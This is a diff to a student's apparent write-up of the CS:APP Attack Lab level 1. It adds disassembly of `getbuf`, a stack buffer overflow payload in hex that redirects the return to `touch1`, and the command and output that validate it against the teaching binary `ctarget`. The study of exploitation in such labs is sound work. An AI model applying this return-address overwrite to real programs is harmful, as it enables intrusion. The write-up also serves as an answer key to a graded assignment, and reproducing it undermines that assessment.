@@ -101,11 +101,36 @@ use an input string to overwrite replace the stack frame at `0x5561dca0` by the 
 of `<touch1>`. Next we will caluculate the size of bytes we need to inject in order
 to reach `0x5561dca0`.
 ```
-  0x4017a8 <getbuf>       sub    $0x28,%rsp
-  ...
-  0x401a47 <Gets>         movl   $0x0,0x2036b3(%rip) 
+  <getbuf>
+  0x4017a8:   sub    $0x28,%rsp
+  0x4017ac:   mov    %rsp,%rdi
+  0x4017af:   callq  401a40 <Gets>
+  0x4017b4:   mov    $0x1,%eax
+  0x4017b9:   add    $0x28,%rsp
+  0x4017bd:   retq
 ```
-
+According to the disassembled code, `<getbuf>` applies 40 bytes to stack, which means
+that we need to first inject 40 bytes to occupy the stack of `<getbuf>` and then followed
+by 8 bytes of address for `<touch1>` for the `retq` to redirect. Attention before the
+end of our exploit, `00` is not allowed as it indicates end of C string. One possible
+solution can be
+```
+  66 75 63 6b 47 46 57 21
+  66 75 63 6b 47 46 57 21
+  66 75 63 6b 47 46 57 21
+  66 75 63 6b 47 46 57 21
+  66 75 63 6b 47 46 57 21
+  C0 17 40 00 00 00 00 00
+```
+Let's put the solution to file `ctarget.exploit.l1.txt`, and we can validate it by
+executing from the following command `/src`
+```
+  03-Attack-Lab/src > cat ctarget.exploit.l1.txt | ./hex2raw | ./ctarget -q
+    Cookie: 0x59b997fa
+    Type string:Touch1!: You called touch1()
+    Valid solution for level 1 with target ctarget
+    PASS: ...
+```
 
 ### Level 2
 
